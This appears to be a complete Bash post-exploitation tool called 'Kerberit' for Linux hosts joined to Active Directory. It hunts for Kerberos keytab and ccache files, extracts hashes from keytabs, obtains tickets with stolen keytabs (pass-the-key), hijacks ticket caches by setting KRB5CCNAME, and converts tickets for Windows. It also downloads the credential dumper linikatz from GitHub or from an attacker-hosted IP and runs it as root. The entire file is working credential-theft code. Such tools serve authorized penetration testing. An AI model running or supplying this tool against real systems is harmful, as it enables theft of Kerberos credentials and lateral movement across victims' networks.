#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m' 
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_status() { echo -e "${GREEN}[+]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
print_error() { echo -e "${RED}[-]${NC} $1"; }

banner() {
    clear
    echo -e "${BLUE}====================================================="
    echo "           Kerberit ʕʘ̅͜ʘ̅ʔ"
    echo "====================================================="
    echo "Required tools: kinit, klist, wget/curl"
    echo "Optional: impacket-ticketConverter, keytabextract.py"
    echo "========================================================"
    echo
}

check_tools() {
    missing=""
    command -v kinit >/dev/null || missing="$missing kinit"
    command -v klist >/dev/null || missing="$missing klist"
    if ! command -v wget >/dev/null && ! command -v curl >/dev/null; then
        missing="$missing wget/curl"
    fi
    
    if [ -n "$missing" ]; then
        print_error "Missing required tools:$missing"
        exit 1
    fi
}

get_linikatz() {
    print_status "Linikatz download options:"
    echo "1) Download from GitHub (requires internet)"
    echo "2) Download from your attack box (local network)"
    echo
    read -p "Choose download method (1/2): " method
    
    case $method in
        1)
            print_status "Downloading from GitHub..."
            if wget -q https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh -O /tmp/linikatz.sh 2>/dev/null ||
               curl -s https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh -o /tmp/linikatz.sh 2>/dev/null; then
                chmod +x /tmp/linikatz.sh
                print_status "Downloaded from GitHub successfully"
                return 0
            else
                print_error "GitHub download failed"
                return 1
            fi
            ;;
        2)
            echo "Setup instructions:"
            echo "  1) Download linikatz.sh to your attack box"
            echo "  2) Host it: (with python3 -m http.server 8000)"
            echo "  3) Enter your attack box details below"
            echo
            read -p "Enter your attack box IP: " ip
            [ -z "$ip" ] && { print_error "IP required for local download -_-"; return 1; }
            
            read -p "Enter port (default 8000): " port
            port=${port:-8000}
            
            local url="http://$ip:$port/linikatz.sh"
            print_status "Downloading from: $url"
            
            if wget -q "$url" -O /tmp/linikatz.sh 2>/dev/null ||
               curl -s "$url" -o /tmp/linikatz.sh 2>/dev/null; then
                chmod +x /tmp/linikatz.sh
                print_status "Downloaded from attack box successfully"
                return 0
            else
                print_error "Failed to download from attack box"
                print_error "Make sure linikatz.sh is in your root web server directory and you provided the right IP and PORT"
                return 1
            fi
            ;;
        *)
            print_error "Invalid choice"
            return 1
            ;;
    esac
}

    
    

find_keytabs() {
    find / -name "*keytab*" -o -name "*.ktab" 2>/dev/null | sort -u
    [ -f /etc/krb5.keytab ] && echo "/etc/krb5.keytab"
}

find_ccaches() {
    local krb_file=$(env | grep KRB5CCNAME | cut -d'=' -f2 | sed 's/FILE://')
    [ -f "$krb_file" ] && echo "$krb_file"
    find /tmp /var/tmp /dev/shm /var/lib/sss/db -name "krb5cc_*" -o -name "*.ccache" -o -name "ccache_*" 2>/dev/null | sort -u
}

show_files() {
    local title="$1"
    shift
    local files=("$@")
    
    if [ ${#files[@]} -eq 0 ]; then
        print_warning "No $title found"
        return 1
    fi
    
    print_status "Found ${#files[@]} $title:"
    printf "%-4s %-70s %-5s %-5s\n" "Num" "File Path" "Read" "Write"
echo "--------------------------------------------------------------------------------"

local i=1 readable_count=0
for file in "${files[@]}"; do
    local can_read="No" can_write="No"
    [ -r "$file" ] && { can_read="Yes"; ((readable_count++)); }
    [ -w "$file" ] && can_write="Yes"
    
    # Truncate long paths to 70 characters
    local display_file="$file"
    if [ ${#file} -gt 70 ]; then
        display_file="...${file: -67}"
    fi
    
    if [ "$can_read" = "Yes" ]; then
        printf "${GREEN}[%-2s]${NC} %-70s %-5s %-5s\n" "$i" "$display_file" "$can_read" "$can_write"
    else
        printf "[%-2s] %-70s %-5s %-5s\n" "$i" "$display_file" "$can_read" "$can_write"
    fi
    ((i++))
done
    
    
    echo
    [ $readable_count -gt 0 ] && print_status "$readable_count readable files (highlighted in green)"
    return 0
}

analyze_keytab() {
    local ktfile="$1"
    
    print_status "Analyzing keytab: $ktfile"
    klist -k -t "$ktfile" 2>/dev/null || { print_error "Cannot read keytab file"; return 1; }
    
    echo
    read -p "Extract hashes from this keytab? (y/N): " choice
    if [ "$choice" = "y" ] || [ "$choice" = "Y" ]; then
        local extractor=""
        for path in /tools/keytabextract.py /opt/keytabextract.py ./keytabextract.py; do
            [ -f "$path" ] && { extractor="$path"; break; }
        done
        
        if [ -n "$extractor" ]; then
            python3 "$extractor" "$ktfile"
        else
            print_warning "KeyTabExtract not found. Download it from:"
            echo "https://github.com/sosdave/KeyTabExtract"
        fi
    fi
    
    echo
    read -p "Use this keytab to obtain a ticket? (y/N): " choice
    if [ "$choice" = "y" ] || [ "$choice" = "Y" ]; then
        use_keytab "$ktfile"
    fi
}
use_keytab() {
    local ktfile="$1"
    
    local principal=$(klist -k "$ktfile" 2>/dev/null | grep -v "Keytab\|KVNO\|^$\|---" | grep "@" | head -n1 | awk '{print $NF}')
    
    if [ -z "$principal" ]; then
        print_error "Could not extract principal from keytab"
        return 1
    fi
    
    print_status "Using principal: $principal"
    
    # Clear any existing tickets and set clean ccache
    kdestroy -A 2>/dev/null
    export KRB5CCNAME="FILE:/tmp/kerberit_$(id -u)_$$"
    
    if kinit "$principal" -k -t "$ktfile"; then
        print_status "Successfully obtained Kerberos ticket!"
        klist 2>/dev/null
        print_status "Ready for impacket tools or evil-winrm"
    else
        print_error "Failed to obtain ticket from keytab"
        print_warning "Try manually: export KRB5CCNAME=FILE:/tmp/ticket && kinit $principal -k -t $ktfile"
    fi
}
    
    
    
    

check_ticket_validity() {
    local ccache="$1"
    print_status "Checking ticket validity:"
    klist -c "$ccache" 2>/dev/null
}

use_ccache() {
    local ccache="$1"
    
    check_ticket_validity "$ccache" || return 1
    
    local temp_ccache="/tmp/$(basename "$ccache")_$$"
    cp "$ccache" "$temp_ccache" || { print_error "Cannot copy ccache file"; return 1; }
    
    export KRB5CCNAME="FILE:$temp_ccache"
    print_status "Set KRB5CCNAME environment variable to: $KRB5CCNAME"
    
    echo
    print_status "Current active tickets:"
    klist 2>/dev/null
    
    echo
    read -p "Convert ticket to kirbi format for Windows? (y/N): " choice
    if [ "$choice" = "y" ] || [ "$choice" = "Y" ]; then
        if command -v impacket-ticketConverter >/dev/null 2>&1; then
            local kirbi="${temp_ccache}.kirbi"
            impacket-ticketConverter "$temp_ccache" "$kirbi"
            print_status "Kirbi file saved as: $kirbi"
        else
            print_warning "impacket-ticketConverter not found in PATH"
        fi
    fi
}

check_cronjobs() {
    print_status "Checking cronjobs for Kerberos-related entries..."
    echo
    echo "User crontab:"
    crontab -l 2>/dev/null | grep -i "keytab\|kinit" || echo "  No Kerberos entries found in user crontab"
    echo
    
    if [ -r /etc/crontab ]; then
        echo "System crontab (/etc/crontab):"
        grep -i "keytab\|kinit" /etc/crontab 2>/dev/null || echo "  No Kerberos entries found"
        echo
    fi
    
    if [ -d /etc/cron.d ]; then
        echo "Cron.d directory entries:"
        grep -r -i "keytab\|kinit" /etc/cron.d/ 2>/dev/null || echo "  No Kerberos entries found in cron.d"
        echo
    fi
}

search_keytabs() {
    echo -e "${BLUE}=== KEYTAB FILE SEARCH ===${NC}"
    print_status "Searching for keytab files..."
    
    local files=()
    while IFS= read -r line; do files+=("$line"); done < <(find_keytabs)
    
    show_files "keytab files" "${files[@]}" || return
    
    read -p "Analyze which file? (enter number or press enter to skip): " num
    
    if [ -n "$num" ] && [ "$num" -gt 0 ] && [ "$num" -le ${#files[@]} ]; then
        local selected="${files[$((num-1))]}"
        if [ -r "$selected" ]; then
            analyze_keytab "$selected"
        else
            print_error "Cannot read the selected file"
        fi
    fi
}

search_ccaches() {
    echo -e "${BLUE}=== CCACHE FILE SEARCH ===${NC}"
    print_status "Searching for ccache files..."
    
    local files=()
    while IFS= read -r line; do files+=("$line"); done < <(find_ccaches)
    
    show_files "ccache files" "${files[@]}" || return
    
    read -p "Use which file? (enter number or press enter to skip): " num
    
    if [ -n "$num" ] && [ "$num" -gt 0 ] && [ "$num" -le ${#files[@]} ]; then
        local selected="${files[$((num-1))]}"
        if [ -r "$selected" ]; then
            use_ccache "$selected"
        else
            print_error "Cannot read the selected file"
        fi
    fi
}

run_linikatz() {
    if [ "$EUID" -ne 0 ]; then
        print_error "I said root privileges are required for linikatz -_-"
        return 1
    fi
    
    echo
    if [ -f /tmp/linikatz.sh ]; then
        print_status "Running linikatz..."
        echo "================== LINIKATZ OUTPUT =================="
        /tmp/linikatz.sh
        echo "=================== END OUTPUT ==================="
    else
        if get_linikatz; then
            echo
            print_status "Running linikatz (this may take a moment)..."
            echo "================== LINIKATZ OUTPUT =================="
            /tmp/linikatz.sh
            echo "=================== END OUTPUT ==================="
        else
            print_error "Failed to download linikatz"
        fi
    fi
    echo
}

quick_ad_check() {
    echo -e "${BLUE}[*] Checking Active Directory environment...${NC}"
    
    if command -v realm >/dev/null 2>&1; then
        realm list 2>/dev/null | head -10
    fi
    
    ps -ef | grep -E "winbind|sssd" | grep -v grep | head -5
    env | grep KRB5CCNAME || echo "No KRB5CCNAME environment variable set"
    echo
}

main_menu() {
    while true; do
        echo -e "${BLUE}=== CHOOSE WISELY ===${NC}"
        echo "1) Find and analyze keytab files"
        echo "2) Find and use ccache files"
        echo "3) Search for both file types"
        echo "4) Check Active Directory status"
        echo "5) Check cronjobs for Kerberos related scripts"
        echo "6) Run linikatz (easiest but require root)"
        echo "7) Exit program"
        echo
        read -p "Enter your poison: " choice
        
        case $choice in
            1) search_keytabs ;;
            2) search_ccaches ;;
            3) search_keytabs; echo; search_ccaches ;;
            4) quick_ad_check ;;
            5) check_cronjobs ;;
            6) run_linikatz ;;
            7) print_status "Ba byeeee"; exit 0 ;;
            *) print_error "Invalid choice -_-" ;;
        esac
        
        echo
        read -p "Press Enter to continue..."
        clear
        banner
    done
}

banner
check_tools

echo "Strategy:
1)if root we use linikatz
2)if not we try to find keytabs, if they are found we Pass-the-key
3)or we can Extract NTLM from keytabs
4)If we find a ccache file we import it to KRB5CCNAME var (if multiple ccache files are found choose the one that belong to the highest user pvi)"
echo

if [ "$EUID" -eq 0 ]; then
    print_warning "Running as root - linikatz functionality available"
    read -p "Run linikatz first? (y/N): " choice
    if [ "$choice" = "y" ] || [ "$choice" = "Y" ]; then
        run_linikatz
        read -p "Press enter to continue to manual search..."
    fi
else
    print_status "Running as regular user - manual search mode"
fi

echo
quick_ad_check
main_menu
